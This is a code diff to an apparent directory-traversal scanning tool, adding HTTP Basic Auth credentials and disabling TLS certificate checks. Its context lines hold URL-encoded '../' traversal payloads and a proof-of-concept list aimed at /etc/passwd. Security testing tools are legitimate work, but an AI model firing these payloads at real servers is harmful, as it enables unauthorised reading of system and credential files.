@@ -7,16 +7,18 @@ from urllib.request import urlopen
 from urllib.error import URLError, HTTPError
 from termcolor import colored
 from proxies_list import fetch_proxy
+from requests.auth import HTTPBasicAuth
 
 
 
 class Payload:
 
-	def __init__(self, url, outfile, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
+	def __init__(self, url, outfile, creds, initiate=True, poc=["%2Fetc%2Fpasswd", "%2Fetc%2Fpasswd%00"], verbosity=1, proxies=False, crawler=False):
 		self.url = url.strip()
 		self.verbosity = verbosity
 		self.outfile = outfile
 		self.crawler = crawler
+		self.creds = creds
 		self.linux_dirTraversal = ["%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E%2F%2E%2E", "%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F%2F%2E%2E%2E%2E%2F", "%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E", "%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E%2F%2E%2F%2E%2E"]
 		# poc -> Proof Of Concept (Change it if you want)
 		self.poc = poc
@@ -60,16 +62,17 @@ class Payload:
 			opener = urllib.request.build_opener(proxy_support)
 			urllib.request.install_opener(opener)
 		try:
-			request = urllib.request.Request(url)
-			request.add_header('User-Agent', fetchAgent())
-			response = urlopen(request)
-			response = str(response.read())
+			if self.creds is not None:
+				response = self.cred(url)
+			else:
+				response = requests.get(url, verify=False)
+			response = str(response.content)
 			return self.stripHtmlTags(response)
 		
 		except HTTPError as e:
     			print(colored('[-]', 'red', attrs=['bold']) + ' Error code: ', e.code)		
 		except URLError as e:
-   			 print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ', e.reason) 
+   			 print(colored('[-]', 'red', attrs=['bold']) + ' Reason: ', e.reason)
 
 
 
@@ -80,6 +83,8 @@ class Payload:
 			print("Checking Remote Server Health")
 			if self.proxies:
 				ret = requests.get(self.url, headers=fetchUA(), proxies=fetch_proxy())
+			elif self.creds is not None:
+				ret = self.cred(self.url)
 			else:
 				ret = requests.get(self.url, headers=fetchUA())
 			if ret.status_code == 200:
@@ -93,6 +98,17 @@ class Payload:
 			print(colored('[-]', 'red', attrs=['bold']) + ' Something went wrong, ', e)
 			print(colored('[!]', 'yellow', attrs=['bold']) + ' The URL format must be http://[URL]?[something]=')
 			return False
+
+
+
+
+	def cred(self, url):
+		list_creds = self.creds.split(':')
+		user = list_creds[0]
+		passwd = list_creds[1]
+		ret = requests.get(url, headers=fetchUA(), verify=False, auth=HTTPBasicAuth(user, passwd))
+		return(ret)
+
 			
 
 
